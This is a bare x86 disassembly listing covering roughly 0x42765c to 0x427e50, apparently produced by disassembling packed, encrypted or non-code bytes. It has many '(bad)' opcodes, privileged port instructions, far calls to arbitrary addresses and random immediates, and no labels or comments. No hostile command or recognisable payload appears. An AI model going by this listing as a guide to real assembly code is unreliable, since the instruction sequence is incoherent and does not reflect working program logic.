  42765c:	fdiv   DWORD PTR [ebp+0x1b]
  42765f:	leave  
  427660:	repz dec edx
  427662:	lods   al,BYTE PTR ds:[esi]
  427663:	pop    ss
  427664:	ret    
  427665:	test   al,0x9d
  427667:	push   ds
  427668:	mov    cl,0xf8
  42766a:	fwait
  42766b:	inc    esp
  42766c:	outs   dx,DWORD PTR ds:[esi]
  42766d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42766e:	test   edx,ecx
  427670:	xchg   esi,eax
  427671:	or     dh,BYTE PTR [edx]
  427673:	xor    eax,0x2430fbf1
  427678:	xchg   BYTE PTR [edi+0x5ac779a7],dl
  42767e:	push   ebx
  42767f:	nop
  427680:	(bad)  
  427681:	push   ebx
  427682:	dec    ebx
  427683:	pop    esp
  427684:	iret   
  427685:	pop    edx
  427686:	lahf   
  427687:	pop    ss
  427688:	and    DWORD PTR [ecx+ebp*4-0x5790eca],esp
	...
  427697:	add    BYTE PTR [eax],al
  427699:	add    BYTE PTR [ecx-0x6600738],bl
  42769f:	mov    edi,0xcf7dceff
  4276a4:	stc    
  4276a5:	popf   
  4276a6:	xchg   ecx,eax
  4276a7:	pushf  
  4276a8:	scas   eax,DWORD PTR es:[edi]
  4276a9:	out    0x69,eax
  4276ab:	in     al,dx
  4276ac:	add    DWORD PTR [eax],eax
  4276ae:	std    
  4276af:	add    DWORD PTR [eax],eax
  4276b1:	add    al,al
  4276b3:	les    esp,FWORD PTR [eax+eiz*8+0x2e]
  4276b7:	dec    ebp
  4276b8:	jp     0x427693
  4276ba:	data16 fwait
  4276bc:	ins    DWORD PTR es:[edi],dx
  4276bd:	icebp  
  4276be:	xlat   BYTE PTR ds:[ebx]
  4276bf:	mov    ebp,0x42864c25
  4276c4:	loop   0x427739
  4276c6:	ror    cl,cl
  4276c8:	out    dx,eax
  4276c9:	ret    0x3261
  4276cc:	sbb    eax,0x91ad3fbd
  4276d1:	push   edx
  4276d2:	fnsave [ecx+eiz*4-0x4c]
  4276d6:	cwde   
  4276d7:	inc    eax
  4276d8:	imul   esi,DWORD PTR [ebx+ebx*4+0x54],0x62b2715
  4276e0:	fs (bad) 
  4276e2:	fisub  WORD PTR [ebp-0xd3e57f2]
  4276e8:	sub    ebx,esi
  4276ea:	leave  
  4276eb:	sbb    cl,BYTE PTR [edx-0x7b82aaf3]
  4276f1:	imul   edi,DWORD PTR [esi-0xe],0x9ca9825d
  4276f8:	mov    bh,0x4d
  4276fa:	mov    ds:0x17e0f72b,eax
  4276ff:	in     eax,dx
  427700:	mov    ds:0x5aca4e4d,eax
  427705:	sub    DWORD PTR [edi+0x70726ccd],ebx
  42770b:	retf   
  42770c:	add    al,0xfc
  42770e:	push   0xffffffb1
  427710:	or     bl,bl
  427712:	sbb    ebp,DWORD PTR [ecx-0x7a33b4da]
  427718:	sbb    dh,0x45
  42771b:	pop    esi
  42771c:	test   ah,0x7
  42771f:	mov    esi,0x2d2ad74
  427724:	xor    ebx,esp
  427726:	mov    BYTE PTR ds:[esi+0x3a1f859b],dl
  42772d:	xchg   BYTE PTR [edx],dh
  42772f:	ret    0x67d1
  427732:	not    ah
  427734:	jb     0x4277ac
  427736:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427737:	hlt    
  427738:	sbb    BYTE PTR [ecx+edi*8-0x61bb5169],dl
  42773f:	push   ss
  427740:	cmp    eax,0xa1a342d9
  427745:	scas   al,BYTE PTR es:[edi]
  427746:	repz jne 0x427764
  427749:	mov    esi,0x3eabe60a
  42774e:	sub    BYTE PTR [ecx+0x3d7a863],ch
  427754:	sahf   
  427755:	lods   eax,DWORD PTR ds:[esi]
  427756:	mov    al,ds:0xad7ccbe6
  42775b:	aad    0x36
  42775d:	mul    DWORD PTR [ecx+0x60b9521a]
  427763:	or     ah,BYTE PTR [ecx+0x22]
  427766:	or     BYTE PTR [esi+0x4fbedb72],bh
  42776c:	mov    al,ds:0x8f417490
  427771:	jns    0x427773
  427773:	sbb    DWORD PTR [edx],ebx
  427775:	cmp    BYTE PTR [eax+esi*8+0x6bacd624],ah
  42777c:	xor    al,0x32
  42777e:	jecxz  0x42778b
  427780:	and    DWORD PTR [ebx-0x1cb491cc],ebx
  427786:	loopne 0x42771c
  427788:	or     DWORD PTR [ebx+0x609af399],0x45
  42778f:	out    0xae,eax
  427791:	jmp    0x9b70aa20
  427796:	or     BYTE PTR [ebx+ebp*1+0x12ca2890],ch
  42779d:	test   al,bl
  42779f:	into   
  4277a0:	fstp   DWORD PTR [ebx-0x3bc6bbc3]
  4277a6:	int3   
  4277a7:	in     eax,0x33
  4277a9:	loopne 0x42775d
  4277ab:	xchg   edi,eax
  4277ac:	loopne 0x42777f
  4277ae:	xchg   edi,eax
  4277af:	push   ss
  4277b0:	xor    al,al
  4277b2:	sti    
  4277b3:	push   ss
  4277b4:	or     al,0x44
  4277b6:	xlat   BYTE PTR ds:[ebx]
  4277b7:	cmp    eax,0x7cc3db2e
  4277bc:	ins    BYTE PTR es:[edi],dx
  4277bd:	push   cs
  4277be:	jae    0x427818
  4277c0:	mov    ch,0x68
  4277c2:	ins    DWORD PTR es:[edi],dx
  4277c3:	loope  0x427778
  4277c5:	mov    ds:0xeca038fe,eax
  4277ca:	sti    
  4277cb:	sbb    al,0xd4
  4277cd:	adc    al,0xd8
  4277cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4277d0:	mov    BYTE PTR [ecx+0x205fdaf2],bh
  4277d6:	(bad)  
  4277d7:	jge    0x42781a
  4277d9:	ds or  bl,0xde
  4277dd:	push   ebp
  4277de:	dec    esi
  4277df:	sub    ah,dh
  4277e1:	loope  0x4277fa
  4277e3:	outs   dx,DWORD PTR ds:[esi]
  4277e4:	sub    cl,BYTE PTR [edx+esi*1+0x26e0bf14]
  4277eb:	add    al,bl
  4277ed:	retf   
  4277ee:	ret    0x9eb2
  4277f1:	add    al,0xaa
  4277f3:	xchg   esi,edx
  4277f5:	mov    ah,0xec
  4277f7:	js     0x4277da
  4277f9:	jb     0x42782b
  4277fb:	mov    ds:0xdbed5a9c,eax
  427800:	xlat   BYTE PTR ds:[ebx]
  427801:	jne    0x42779b
  427803:	mov    ch,0x26
  427805:	call   0xa567:0x84a3d23a
  42780c:	je     0x4277f6
  42780e:	adc    al,0xb3
  427810:	mov    edi,eax
  427812:	and    BYTE PTR [ecx],al
  427814:	pop    ecx
  427815:	cmp    ecx,DWORD PTR [edi-0x28524847]
  42781b:	(bad)  
  42781c:	dec    edi
  42781d:	shl    DWORD PTR [edi+0x35],1
  427820:	xor    al,0xd6
  427822:	aam    0xc0
  427824:	add    BYTE PTR ds:0x7ec5241e,bl
  42782a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42782b:	es (bad) 
  42782d:	fldcw  WORD PTR [ebp+0x293070cf]
  427833:	jbe    0x427800
  427835:	jnp    0x4277e1
  427837:	xchg   ebp,eax
  427838:	in     eax,dx
  427839:	fdivr  DWORD PTR [edx-0x78]
  42783c:	jp     0x42786b
  42783e:	xchg   ebx,eax
  42783f:	mov    esp,0x434d6a9b
  427844:	scas   eax,DWORD PTR es:[edi]
  427845:	or     al,0x7e
  427847:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427848:	es dec ebp
  42784a:	cmp    dl,BYTE PTR ds:0x24b11674
  427850:	mov    ch,0xd
  427852:	xor    al,ch
  427854:	mul    BYTE PTR [eax-0x63]
  427857:	fidivr WORD PTR [ecx]
  427859:	jno    0x427844
  42785b:	or     ecx,ecx
  42785d:	push   DWORD PTR [ebx+0x2b217bac]
  427863:	jae    0x4278a9
  427865:	out    dx,al
  427866:	cli    
  427867:	lahf   
  427868:	ror    edi,0xe0
  42786b:	js     0x4278b3
  42786d:	pop    ebx
  42786e:	lea    esi,[edx-0x7874a082]
  427874:	aas    
  427875:	pop    esi
  427876:	dec    ebx
  427877:	sub    esp,DWORD PTR [ecx+0x6]
  42787a:	xor    BYTE PTR [edi],bl
  42787c:	or     al,0xaf
  42787f:	(bad)  
  427880:	mov    ch,0xf5
  427882:	es stos BYTE PTR es:[edi],al
  427884:	loopne 0x4278ab
  427886:	aam    0x96
  427888:	mov    cl,BYTE PTR [ecx-0x9]
  42788b:	popf   
  42788c:	xor    eax,0x9dc2f073
  427891:	clc    
  427892:	push   sp
  427894:	fcom   DWORD PTR [ebx-0x6d698cbe]
  42789a:	jp     0x4278d4
  42789c:	dec    esi
  42789d:	mov    bh,0x28
  42789f:	enter  0xfa94,0x19
  4278a3:	push   ecx
  4278a4:	popa   
  4278a5:	jne    0x4278f9
  4278a7:	cmp    eax,DWORD PTR [ebp+0x6f]
  4278aa:	adc    BYTE PTR [edi+0x2fb660],0x0
	...
  4278b9:	add    BYTE PTR [ecx+0xa],bh
  4278bc:	sbb    BYTE PTR gs:[edi+0x7f],dh
  4278c0:	jge    0x42792d
  4278c2:	and    DWORD PTR [ebp+0x30],ecx
  4278c5:	dec    esi
  4278c6:	pop    esp
  4278c7:	add    al,0x9d
  4278c9:	adc    esp,DWORD PTR [esi-0x12]
  4278cc:	add    DWORD PTR [eax],eax
  4278ce:	std    
  4278cf:	add    DWORD PTR [eax],eax
  4278d1:	add    BYTE PTR [edx],dl
  4278d3:	xlat   BYTE PTR ds:[ebx]
  4278d4:	adc    bh,BYTE PTR [ebx]
  4278d6:	mov    al,0xaa
  4278d8:	sub    eax,0x50949e9b
  4278dd:	cmp    eax,0x1923cc8f
  4278e2:	mov    esp,0xf5c95d12
  4278e7:	arpl   WORD PTR [esi-0x68e0ce9e],bp
  4278ed:	imul   esi,DWORD PTR ds:0x3803870d,0xdb1e654f
  4278f7:	es loopne 0x4278fa
  4278fa:	pop    esp
  4278fb:	call   0x6834:0x85658b09
  427902:	jne    0x427925
  427904:	inc    esp
  427905:	and    dh,BYTE PTR [ecx]
  427907:	mov    WORD PTR [edi+0x5b],ss
  42790a:	sar    BYTE PTR [esi+0x3e],1
  42790d:	or     eax,0x9141cc3a
  427912:	ficom  WORD PTR [esi+0x7e2062c4]
  427918:	and    bh,0x4a
  42791b:	in     eax,0x62
  42791d:	bound  ebx,QWORD PTR [edx-0x74cf566f]
  427923:	mov    cl,0x7c
  427925:	fwait
  427926:	int    0x1f
  427928:	iret   
  427929:	push   0x7de7a61a
  42792e:	iret   
  42792f:	mov    bl,0x86
  427931:	sar    BYTE PTR [edi],cl
  427933:	pop    edi
  427934:	adc    eax,0x360f0b4b
  427939:	or     cl,BYTE PTR [esi-0x55]
  42793c:	push   esi
  42793d:	or     DWORD PTR [esi+ebx*8],ebx
  427940:	nop
  427941:	and    al,0xa1
  427943:	sbb    ch,cl
  427945:	imul   BYTE PTR ds:0xfa7d815f
  42794b:	test   bh,0xb3
  42794e:	and    dh,BYTE PTR [ecx+0x7f]
  427951:	stc    
  427952:	mov    ah,0x9a
  427954:	add    al,0x28
  427956:	fnstenv [ecx+esi*2-0xb6f5239]
  42795d:	adc    DWORD PTR [esi+0x52487260],esi
  427963:	or     BYTE PTR [edx-0xb773239],0xc
  42796a:	sbb    ch,BYTE PTR [ebp+0x319dfafc]
  427970:	out    0x9f,eax
  427972:	fdivr  QWORD PTR cs:[edi-0x5188a266]
  427979:	repz xor al,0x49
  42797c:	push   eax
  42797d:	into   
  42797e:	gs pushaw 
  427981:	jge    0x4279a8
  427983:	jl     0x427917
  427985:	mov    bh,0x58
  427987:	xor    ebp,esp
  427989:	lods   eax,DWORD PTR ds:[esi]
  42798a:	pop    esi
  42798b:	imul   esp,DWORD PTR [ebx-0x16],0xffffff94
  42798f:	jle    0x427960
  427991:	sbb    al,0x7c
  427993:	pop    esp
  427994:	jo     0x42792e
  427996:	pop    eax
  427997:	inc    ecx
  427998:	dec    ebx
  427999:	repnz pop sp
  42799c:	jo     0x4279ce
  42799e:	mov    bh,0x58
  4279a0:	inc    edx
  4279a1:	or     DWORD PTR [ebx+0x7],esi
  4279a4:	inc    esi
  4279a5:	jno    0x427951
  4279a7:	add    al,BYTE PTR ds:0x3b9e6b51
  4279ad:	jns    0x4279f1
  4279af:	and    bh,BYTE PTR [eax]
  4279b1:	or     BYTE PTR [ecx],0xe7
  4279b4:	add    al,0xfc
  4279b6:	push   ebx
  4279b7:	ja     0x4279d9
  4279b9:	push   es
  4279ba:	call   0x2e1b:0xe8d8d64d
  4279c1:	mov    ecx,0x4ac0fe0e
  4279c6:	and    bl,BYTE PTR [ecx-0x298b7596]
  4279cc:	sub    eax,0x7a67d1f4
  4279d1:	or     eax,0x5a7ecefa
  4279d6:	and    DWORD PTR [edx],0x3a
  4279d9:	addr16 nop
  4279db:	fist   WORD PTR [ecx]
  4279dd:	jmp    0x6c8a:0x960d8ae8
  4279e4:	test   eax,ebx
  4279e6:	jecxz  0x427a39
  4279e8:	push   edx
  4279e9:	mov    eax,0x2851ba34
  4279ee:	fs (bad) 
  4279f0:	out    dx,eax
  4279f1:	test   al,0xce
  4279f3:	call   0x1880b5bf
  4279f8:	pop    ss
  4279f9:	(bad)  
  4279fa:	fiadd  WORD PTR [edx+0x35f67049]
  427a00:	outs   dx,DWORD PTR ds:[esi]
  427a01:	sbb    ch,BYTE PTR [eax-0x7784e6db]
  427a07:	push   ebx
  427a08:	inc    esp
  427a09:	sbb    DWORD PTR [eax+0x1c],eax
  427a0c:	cs push esi
  427a0e:	dec    ebx
  427a0f:	push   ebx
  427a10:	lods   eax,DWORD PTR ds:[esi]
  427a11:	jecxz  0x427a1a
  427a13:	mov    ebp,0x867b43cb
  427a18:	fisttp WORD PTR [ebp+edx*4+0x19ccadf2]
  427a1f:	ror    DWORD PTR [eax+0x2132ec24],0x4
  427a26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a27:	es xor eax,0x92c8ad34
  427a2d:	std    
  427a2e:	xor    BYTE PTR [ecx+0x22],0xd8
  427a32:	adc    bh,dh
  427a34:	icebp  
  427a35:	push   esi
  427a36:	mov    bh,0x3c
  427a38:	clc    
  427a39:	outs   dx,DWORD PTR ds:[esi]
  427a3a:	sub    edi,DWORD PTR [edi+0x46]
  427a3d:	imul   eax,DWORD PTR [ecx+0x5b70f580],0x48
  427a44:	inc    edx
  427a45:	mov    dl,0x48
  427a47:	mov    esi,0xf674b548
  427a4c:	test   BYTE PTR [edi],al
  427a4e:	stos   DWORD PTR es:[edi],eax
  427a4f:	jne    0x427a67
  427a51:	daa    
  427a52:	pop    esp
  427a53:	pusha  
  427a54:	jl     0x427a14
  427a56:	jnp    0x427ad3
  427a58:	and    eax,0x1ba644eb
  427a5d:	outs   dx,BYTE PTR ds:[esi]
  427a5e:	mov    ch,0xfd
  427a60:	inc    ebp
  427a61:	xchg   ebp,eax
  427a62:	mov    eax,0x3f9dd056
  427a67:	(bad)  
  427a68:	xchg   edx,eax
  427a69:	add    cl,al
  427a6b:	push   eax
  427a6c:	scas   al,BYTE PTR es:[edi]
  427a6d:	pop    edi
  427a6e:	sbb    BYTE PTR [ebx],bl
  427a70:	into   
  427a71:	inc    ebx
  427a72:	fwait
  427a73:	sbb    dh,ah
  427a75:	repz push edi
  427a77:	pop    edx
  427a78:	push   0xffffff90
  427a7a:	je     0x427a38
  427a7c:	xor    bh,BYTE PTR [eax+0x6eb467b9]
  427a82:	adc    eax,0xd3af8419
  427a87:	(bad)
  427a8a:	ins    DWORD PTR es:[edi],dx
  427a8b:	or     eax,0x961ffabb
  427a90:	test   al,0xad
  427a92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a93:	mov    eax,ds:0x80ae2cf6
  427a98:	mov    ebx,0x9d672d26
  427a9d:	(bad)  
  427a9e:	not    dl
  427aa0:	cs icebp 
  427aa2:	fmul   st(3),st
  427aa4:	cmp    eax,0x8c4d8fb6
  427aa9:	mov    WORD PTR [eax-0xf],cs
  427aac:	adc    DWORD PTR fs:[esp+ecx*8-0x3e6ac770],0xffffffaa
  427ab5:	sub    dl,bh
  427ab7:	lds    esp,FWORD PTR [ebp-0x30]
  427aba:	mov    eax,ds:0x3b7a40d6
  427abf:	xor    DWORD PTR [ecx],edx
  427ac1:	sub    BYTE PTR [eax+edi*8-0x5125002c],bh
  427ac8:	push   edi
  427ac9:	add    DWORD PTR ds:0xd0467417,edi
	...
  427ad7:	add    BYTE PTR [eax],al
  427ad9:	add    BYTE PTR [ecx+0x3],bl
  427adc:	rol    DWORD PTR [ebx+ebx*8-0x3a],0xdd
  427ae1:	pop    ds
  427ae2:	arpl   WORD PTR [edi-0x16ccb294],di
  427ae8:	retf   0x630f
  427aeb:	lock add DWORD PTR [eax],eax
  427aee:	std    
  427aef:	add    DWORD PTR [eax],eax
  427af1:	add    BYTE PTR ds:0xdfdf5ff2,dh
  427af7:	sti    
  427af8:	add    dh,BYTE PTR [eax+0xe2d7edb]
  427afe:	lods   al,BYTE PTR ds:[esi]
  427aff:	sahf   
  427b00:	fcomp  DWORD PTR [edx+0x4942286a]
  427b06:	jno    0x427b6e
  427b08:	addr16 call 0x71e9:0xcd17feb3
  427b10:	xchg   esp,eax
  427b11:	aas    
  427b12:	sbb    eax,0xb9e0dbd5
  427b17:	aam    0x6f
  427b19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427b1a:	mov    bl,0x6d
  427b1c:	subps  xmm6,XMMWORD PTR [ebp-0x3e]
  427b20:	mov    bh,0x97
  427b22:	cmp    cl,BYTE PTR [esi]
  427b24:	leave  
  427b25:	repnz pop edx
  427b27:	dec    eax
  427b28:	lods   al,BYTE PTR ds:[esi]
  427b29:	push   ebx
  427b2a:	mov    esp,0x6d1ee57d
  427b2f:	aam    0x24
  427b31:	mov    al,0x3f
  427b33:	je     0x427b28
  427b35:	mov    bl,0x57
  427b37:	lss    esi,FWORD PTR [esi+0x76]
  427b3b:	sar    edx,1
  427b3d:	sahf   
  427b3e:	xchg   ecx,eax
  427b3f:	mov    ds:0xe19875b0,eax
  427b44:	jae    0x427ade
  427b46:	call   0xd96f444c
  427b4b:	sbb    al,0x35
  427b4d:	xlat   BYTE PTR ds:[ebx]
  427b4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b4f:	pop    edx
  427b50:	add    eax,0x6261ac36
  427b55:	push   ebp
  427b56:	out    0x3b,al
  427b58:	add    ebx,esp
  427b5a:	fild   QWORD PTR [edi+0x28715758]
  427b60:	cli    
  427b61:	push   ebp
  427b62:	xlat   BYTE PTR ds:[ebx]
  427b63:	in     al,0xf1
  427b65:	nop
  427b66:	popa   
  427b67:	sub    eax,0xbffd33cd
  427b6c:	aas    
  427b6d:	mov    ebp,0xa6b8255
  427b72:	xchg   edx,eax
  427b73:	pusha  
  427b74:	sub    ebp,DWORD PTR [ebx+0x6c]
  427b77:	arpl   cx,di
  427b79:	lds    edx,FWORD PTR ds:[esi+0x1ac2d979]
  427b80:	fcom   QWORD PTR [edx]
  427b82:	repnz shl BYTE PTR [eax+edx*8-0x75d0c5ce],0xb9
  427b8b:	xchg   ebp,eax
  427b8c:	sub    esp,edx
  427b8e:	pushf  
  427b8f:	push   ecx
  427b90:	mov    al,0xe1
  427b92:	xor    bl,BYTE PTR [edx-0x63a17aef]
  427b98:	pop    ds
  427b99:	mov    esi,0x2e4a2e62
  427b9e:	jo     0x427b67
  427ba0:	and    DWORD PTR [ecx+0x44],edi
  427ba3:	mov    cl,0x83
  427ba5:	sar    DWORD PTR [edi-0x59],1
  427ba8:	mov    bl,0x47
  427baa:	(bad)
  427bad:	das    
  427bae:	adc    dl,dl
  427bb0:	pusha  
  427bb1:	div    DWORD PTR [edi-0x1324a0d6]
  427bb7:	sbb    BYTE PTR [eax-0x46],0x3c
  427bbb:	sar    edi,1
  427bbd:	jg     0x427be8
  427bbf:	je     0x427c13
  427bc1:	push   es
  427bc2:	and    edx,DWORD PTR [ebx]
  427bc4:	cli    
  427bc5:	aad    0xb2
  427bc7:	int    0x6c
  427bc9:	add    al,0x43
  427bcb:	out    0xac,eax
  427bcd:	xor    DWORD PTR [ecx-0x66],esp
  427bd0:	cmc    
  427bd1:	(bad)  
  427bd2:	jb     0x427bc8
  427bd4:	jl     0x427c2b
  427bd6:	mov    bh,0x9a
  427bd8:	mov    ecx,0xabf43d06
  427bdd:	jecxz  0x427c11
  427bdf:	xchg   ecx,eax
  427be0:	sub    ebx,edi
  427be2:	adc    ch,bh
  427be4:	jmp    0x427bb0
  427be6:	ds aam 0xf
  427be9:	retf   0xcb0b
  427bec:	xchg   ebx,eax
  427bed:	push   edi
  427bee:	call   0xe76376d4
  427bf3:	inc    ecx
  427bf4:	out    dx,eax
  427bf5:	fist   WORD PTR [ebx]
  427bf7:	in     al,dx
  427bf8:	jle    0x427c64
  427bfa:	jle    0x427c62
  427bfc:	popf   
  427bfd:	jge    0x427be2
  427bff:	les    edx,FWORD PTR [ecx-0x4b1df6e0]
  427c05:	mov    ah,0x91
  427c07:	jecxz  0x427c14
  427c09:	ss xchg esi,eax
  427c0b:	in     eax,0xa7
  427c0d:	iret   
  427c0e:	sahf   
  427c0f:	or     al,0x6f
  427c11:	(bad)  
  427c12:	loop   0x427c91
  427c14:	xchg   edx,eax
  427c15:	les    esi,FWORD PTR [edi+0x4abdbd11]
  427c1b:	jb     0x427bc0
  427c1d:	scas   eax,DWORD PTR es:[edi]
  427c1e:	mov    eax,ds:0x25925a29
  427c23:	add    BYTE PTR [ebp+0x99977ac],dl
  427c29:	mov    edx,0xa6f3105a
  427c2e:	cld    
  427c2f:	mov    WORD PTR [ebx],?
  427c31:	xchg   DWORD PTR [ebp+0x3231596f],ebp
  427c37:	inc    ebx
  427c38:	or     DWORD PTR [ecx+esi*4+0x2f],edi
  427c3c:	fadd   QWORD PTR [ebp+0x42]
  427c3f:	sub    eax,0x7bb0ebf3
  427c44:	leave  
  427c45:	fmul   DWORD PTR [esi+ebp*2]
  427c48:	in     al,dx
  427c49:	test   BYTE PTR [edi],ch
  427c4b:	xchg   ebx,eax
  427c4c:	outs   dx,DWORD PTR ds:[esi]
  427c4d:	enter  0x29a1,0xaa
  427c51:	xchg   ebx,eax
  427c52:	sbb    bl,ch
  427c54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c55:	mov    edx,0xe2322e3
  427c5a:	push   edx
  427c5b:	(bad)  
  427c5c:	pop    eax
  427c5d:	sbb    bh,BYTE PTR [eax]
  427c5f:	xchg   ebx,eax
  427c60:	dec    ecx
  427c61:	sub    ah,BYTE PTR [edx]
  427c63:	out    dx,eax
  427c64:	pusha  
  427c65:	cmp    BYTE PTR [ecx],dl
  427c67:	(bad)  
  427c68:	das    
  427c69:	sar    dl,cl
  427c6b:	pop    ss
  427c6c:	sbb    BYTE PTR [edi-0x18],dl
  427c6f:	dec    ecx
  427c70:	mov    dh,0x77
  427c72:	cmp    ah,BYTE PTR [esp+eax*8+0x8056bf6]
  427c79:	push   esp
  427c7a:	jmp    0x427c41
  427c7c:	mov    ebx,DWORD PTR [edx+ebx*1+0x47]
  427c80:	mov    esi,0x139485bc
  427c85:	call   0x1fec88ca
  427c8a:	mov    DWORD PTR [edx-0x65],edx
  427c8d:	and    edx,DWORD PTR [ebx+0x58]
  427c90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c91:	dec    ebx
  427c92:	pop    ebp
  427c93:	mov    ah,al
  427c95:	leave  
  427c96:	xor    eax,0x7a812332
  427c9b:	loopne 0x427cd5
  427c9d:	ss fwait
  427c9f:	xor    BYTE PTR [esi+0x82fb651],bh
  427ca5:	lds    esi,FWORD PTR [eax-0x3a]
  427ca8:	xchg   edx,eax
  427ca9:	xchg   ebp,eax
  427caa:	in     al,0x82
  427cac:	and    dl,BYTE PTR [eax-0x69838a86]
  427cb2:	rcr    BYTE PTR [esi+0x3b],0x22
  427cb6:	sbb    al,0x83
  427cb8:	call   0xeaa7:0x24ff600d
  427cbf:	icebp  
  427cc0:	aad    0xe2
  427cc2:	push   es
  427cc3:	xchg   ebx,eax
  427cc4:	push   es
  427cc5:	ja     0x427c6e
  427cc7:	daa    
  427cc8:	mov    dh,BYTE PTR [ecx-0x3]
  427ccb:	sbb    al,0x86
  427ccd:	pop    ebp
  427cce:	das    
  427ccf:	bound  edi,QWORD PTR [edi]
  427cd1:	daa    
  427cd2:	cmp    eax,0x4ea9bb47
  427cd7:	sbb    eax,0x359a249
  427cdc:	lods   al,BYTE PTR ds:[esi]
  427cdd:	push   cs
  427cde:	inc    edi
  427cdf:	pop    ecx
  427ce0:	nop
  427ce1:	xchg   esp,eax
  427ce2:	mov    ebx,0x38bff813
  427ce7:	pop    ds
  427ce8:	repnz scas eax,DWORD PTR es:[di]
  427ceb:	xor    BYTE PTR [edx+0xff6b],0x0
	...
  427cfa:	sbb    esp,DWORD PTR [edi]
  427cfc:	pushf  
  427cfd:	cli    
  427cfe:	mov    esp,0xaae77ffb
  427d03:	xchg   esp,eax
  427d04:	out    dx,eax
  427d05:	cdq    
  427d06:	sub    DWORD PTR [edx+eax*2-0x6f],ebx
  427d0a:	pusha  
  427d0b:	repnz add DWORD PTR [eax],eax
  427d0e:	std    
  427d0f:	add    DWORD PTR [eax],eax
  427d11:	add    BYTE PTR [eax],dh
  427d13:	pop    eax
  427d14:	add    eax,DWORD PTR ss:[esi+0x0]
  427d18:	sub    BYTE PTR [ecx+0x4e],0x12
  427d1c:	inc    edi
  427d1d:	and    BYTE PTR [edi-0x175f026b],dh
  427d23:	xor    eax,0xb22de8c7
  427d28:	aam    0x1e
  427d2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d2b:	ficom  WORD PTR [esi]
  427d2d:	leave  
  427d2e:	pop    edi
  427d2f:	js     0x427cd6
  427d31:	mov    al,ds:0x73af23e9
  427d36:	mov    bh,BYTE PTR [edx+0x36]
  427d39:	test   BYTE PTR [edi+ebx*8],bh
  427d3c:	lea    esp,[esi+edi*1+0x7765183e]
  427d43:	outs   dx,DWORD PTR ds:[esi]
  427d44:	sbb    eax,0xb3b0f102
  427d49:	mov    esi,0xa11a7d16
  427d4e:	or     bl,BYTE PTR [eax-0x76]
  427d51:	jge    0x427d94
  427d53:	shl    eax,1
  427d55:	loope  0x427d29
  427d57:	cmp    DWORD PTR [ebx],ebp
  427d59:	jae    0x427da1
  427d5b:	add    DWORD PTR [ecx+0x48b0c309],edx
  427d61:	inc    ebx
  427d62:	cwde   
  427d63:	xchg   DWORD PTR [eax],esi
  427d65:	or     BYTE PTR [ebx+eiz*4],cl
  427d68:	retf   0xbcd9
  427d6b:	xchg   edi,ecx
  427d6d:	inc    ebx
  427d6e:	cmp    eax,0x10b380af
  427d73:	out    dx,al
  427d74:	mov    ch,0x37
  427d76:	mov    WORD PTR cs:[ebx+0x6b99832],fs
  427d7d:	les    esp,FWORD PTR ds:0x9e62aadd
  427d83:	stc    
  427d84:	sahf   
  427d85:	and    eax,0x5abc0f
  427d8a:	mov    ds:0x78c2be6b,al
  427d8f:	cmc    
  427d90:	scas   eax,DWORD PTR es:[edi]
  427d91:	imul   eax,DWORD PTR [edi-0x2482edfd],0x50936c29
  427d9b:	je     0x427e16
  427d9d:	mov    ss,WORD PTR [edi-0x7f]
  427da0:	inc    edx
  427da1:	hlt    
  427da2:	icebp  
  427da3:	push   ebp
  427da4:	add    BYTE PTR [eax],bh
  427da6:	mov    dl,0xaf
  427da8:	xchg   DWORD PTR [eax],ecx
  427daa:	and    eax,0x3e83af32
  427daf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427db0:	add    edi,DWORD PTR [ecx+0x61]
  427db3:	mov    al,ds:0x86c09357
  427db8:	mov    ch,BYTE PTR [edx+0x2e12dcc5]
  427dbe:	mov    WORD PTR [edx],es
  427dc0:	mov    eax,ds:0x964b6c21
  427dc5:	arpl   WORD PTR [esi+0x7833743e],ax
  427dcb:	fnstcw WORD PTR [esi]
  427dcd:	mov    edi,0xc08f912b
  427dd2:	out    dx,eax
  427dd3:	mov    ds:0x561ad8c,al
  427dd8:	enter  0x2f35,0xd8
  427ddc:	gs stos BYTE PTR es:[edi],al
  427dde:	repz jne 0x427d8c
  427de1:	imul   esi,DWORD PTR [edi+0x35d8aa12],0xffffffb5
  427de8:	sub    dh,BYTE PTR [edi]
  427dea:	sub    eax,ecx
  427dec:	xchg   BYTE PTR [esi-0x8ebd579],bl
  427df2:	int    0x4e
  427df4:	sub    ch,BYTE PTR [esi-0x19]
  427df7:	xlat   BYTE PTR ds:[ebx]
  427df8:	les    edx,FWORD PTR [edx+0x60]
  427dfb:	jns    0x427e78
  427dfd:	in     al,0x17
  427dff:	cmp    al,0x92
  427e01:	inc    esi
  427e02:	sbb    al,0x91
  427e04:	xlat   BYTE PTR ds:[ebx]
  427e05:	xchg   edi,eax
  427e06:	pusha  
  427e07:	arpl   WORD PTR ds:0x5351d920,si
  427e0d:	mov    dh,0xf0
  427e0f:	inc    eax
  427e10:	or     BYTE PTR [ecx+0x6f67f5de],dl
  427e16:	dec    ecx
  427e17:	jo     0x427dce
  427e19:	xchg   edx,eax
  427e1a:	aam    0xc5
  427e1c:	jb     0x427dfd
  427e1e:	jne    0x427db7
  427e20:	sbb    ah,BYTE PTR [eax]
  427e22:	int3   
  427e23:	repz adc ecx,DWORD PTR [esp+ecx*4]
  427e27:	in     eax,0xbc
  427e29:	not    DWORD PTR [esi]
  427e2b:	icebp  
  427e2c:	retf   
  427e2d:	in     al,0xe9
  427e2f:	fdiv   st(2),st
  427e31:	mov    BYTE PTR [edx+0x442c8785],bl
  427e37:	mov    esi,0x7fb95c9a
  427e3c:	mov    eax,ds:0xb032a3a4
  427e41:	mov    edx,0x6879688f
  427e46:	fstp   DWORD PTR [ebx+eax*1+0x4975d408]
  427e4d:	rcl    bh,0x3d
  427e50:	int3   
